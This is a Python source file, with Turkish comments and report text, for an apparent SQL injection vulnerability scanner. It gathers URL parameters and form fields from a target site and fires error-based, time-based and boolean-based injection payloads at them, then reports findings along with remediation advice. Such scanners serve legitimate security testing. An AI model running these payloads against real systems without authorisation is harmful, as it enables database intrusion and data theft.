import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
import time

class SQLInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = {
            'error_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'x'='x",
                "') OR ('x'='x",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--"
            ],
            'time_based': [
                "' SLEEP(5)--",
                "' WAITFOR DELAY '0:0:5'--",
                "' BENCHMARK(50000000,MD5(1))--",
                "') OR SLEEP(5)--",
                "' OR pg_sleep(5)--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
                "') AND ('1'='1",
                "') AND ('1'='2"
            ]
        }
        
    def scan(self):
        """SQL injection zafiyetlerini test eder"""
        result = {
            "title": "SQL Injection Testi",
            "findings": []
        }
        
        try:
            # Ana sayfayı tara
            response = requests.get(self.target_url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form ve parametreleri topla
            injection_points = []
            
            # URL parametrelerini kontrol et
            parsed_url = urlparse(self.target_url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param in params:
                    injection_points.append({
                        'type': 'get',
                        'param': param,
                        'url': self.target_url
                    })
            
            # Formları kontrol et
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(self.target_url, action) if action else self.target_url
                
                # Input alanlarını topla
                for input_tag in form.find_all(['input', 'textarea']):
                    if input_tag.get('type') not in ['submit', 'button', 'file']:
                        injection_points.append({
                            'type': method,
                            'param': input_tag.get('name', ''),
                            'url': form_url
                        })
            
            if not injection_points:
                result["findings"].append({
                    "name": "Enjeksiyon Noktası Bulunamadı",
                    "description": "Test edilebilecek form veya parametre bulunamadı",
                    "risk_level": "Bilgi",
                    "impact": "Yok",
                    "recommendation": "Uygulama giriş noktalarını gözden geçirin"
                })
                return result
            
            # Her nokta için SQL injection testleri yap
            for point in injection_points:
                vulnerabilities = []
                
                # Error-based testler
                for payload in self.payloads['error_based']:
                    try:
                        if point['type'] == 'get':
                            params = {point['param']: payload}
                            response = requests.get(point['url'], params=params, verify=False)
                        else:
                            data = {point['param']: payload}
                            response = requests.post(point['url'], data=data, verify=False)
                        
                        # SQL hata mesajlarını kontrol et
                        error_indicators = [
                            'SQL syntax',
                            'mysql_fetch',
                            'ORA-',
                            'PostgreSQL',
                            'SQLite3',
                            'SQLSTATE',
                            'Microsoft SQL Server'
                        ]
                        
                        if any(indicator in response.text for indicator in error_indicators):
                            vulnerabilities.append({
                                'type': 'Error-based SQL Injection',
                                'payload': payload,
                                'evidence': 'SQL hata mesajı tespit edildi'
                            })
                            break
                            
                    except:
                        continue
                
                # Time-based testler
                for payload in self.payloads['time_based']:
                    try:
                        start_time = time.time()
                        
                        if point['type'] == 'get':
                            params = {point['param']: payload}
                            response = requests.get(point['url'], params=params, verify=False, timeout=10)
                        else:
                            data = {point['param']: payload}
                            response = requests.post(point['url'], data=data, verify=False, timeout=10)
                            
                        execution_time = time.time() - start_time
                        
                        if execution_time >= 5:
                            vulnerabilities.append({
                                'type': 'Time-based SQL Injection',
                                'payload': payload,
                                'evidence': f'Yanıt süresi: {execution_time:.2f} saniye'
                            })
                            break
                            
                    except requests.Timeout:
                        vulnerabilities.append({
                            'type': 'Time-based SQL Injection',
                            'payload': payload,
                            'evidence': 'İstek zaman aşımına uğradı'
                        })
                        break
                    except:
                        continue
                
                # Boolean-based testler
                for i in range(0, len(self.payloads['boolean_based']), 2):
                    try:
                        true_payload = self.payloads['boolean_based'][i]
                        false_payload = self.payloads['boolean_based'][i+1]
                        
                        # True payload testi
                        if point['type'] == 'get':
                            params = {point['param']: true_payload}
                            true_response = requests.get(point['url'], params=params, verify=False)
                        else:
                            data = {point['param']: true_payload}
                            true_response = requests.post(point['url'], data=data, verify=False)
                        
                        # False payload testi
                        if point['type'] == 'get':
                            params = {point['param']: false_payload}
                            false_response = requests.get(point['url'], params=params, verify=False)
                        else:
                            data = {point['param']: false_payload}
                            false_response = requests.post(point['url'], data=data, verify=False)
                        
                        # Yanıtları karşılaştır
                        if true_response.text != false_response.text:
                            vulnerabilities.append({
                                'type': 'Boolean-based SQL Injection',
                                'payload': true_payload,
                                'evidence': 'True/False yanıtları farklı'
                            })
                            break
                            
                    except:
                        continue
                
                # Zafiyet bulunduysa raporla
                if vulnerabilities:
                    for vuln in vulnerabilities:
                        result["findings"].append({
                            "name": f"SQL Injection Açığı: {vuln['type']}",
                            "description": f"URL: {point['url']}\n" + \
                                         f"Parametre: {point['param']}\n" + \
                                         f"Metod: {point['type'].upper()}\n" + \
                                         f"Payload: {vuln['payload']}\n" + \
                                         f"Kanıt: {vuln['evidence']}",
                            "risk_level": "Kritik",
                            "impact": "Veritabanı manipülasyonu ve veri sızıntısı mümkün",
                            "recommendation": "\n".join([
                                "1. Prepared statements kullanın",
                                "2. ORM kullanın",
                                "3. Giriş verilerini doğrulayın ve temizleyin",
                                "4. En az yetki prensibini uygulayın",
                                "5. WAF kullanın",
                                "6. Hata mesajlarını gizleyin",
                                "7. Veritabanı kullanıcı yetkilerini sınırlayın"
                            ])
                        })
            
            # Eğer hiç bulgu yoksa
            if not result["findings"]:
                result["findings"].append({
                    "name": "SQL Injection Açığı Bulunamadı",
                    "description": "Test edilen noktalarda SQL injection açığı tespit edilmedi",
                    "risk_level": "Bilgi",
                    "impact": "Yok",
                    "recommendation": "Düzenli güvenlik kontrollerine devam edin"
                })
                
        except Exception as e:
            result["findings"].append({
                "name": "Tarama Hatası",
                "description": f"SQL injection taraması sırasında hata: {str(e)}",
                "risk_level": "Hata",
                "impact": "SQL injection açıkları belirlenemedi",
                "recommendation": "Sistem yöneticinize başvurun"
            })
            
        return result 